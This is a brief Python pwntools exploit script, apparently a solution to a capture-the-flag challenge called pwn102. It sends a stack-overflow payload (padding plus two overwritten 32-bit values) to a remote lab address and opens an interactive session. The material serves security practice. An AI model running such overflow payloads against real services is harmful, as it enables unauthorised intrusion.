from pwn import *

context.binary = binary = "./pwn102.pwn102"

payload = b"A"*0x68 + p32(0xc0d3) + p32(0xc0ff33)

#p = process()
p = remote("10.10.179.131", 9002)
p.recv()
p.sendline(payload)
p.interactive()
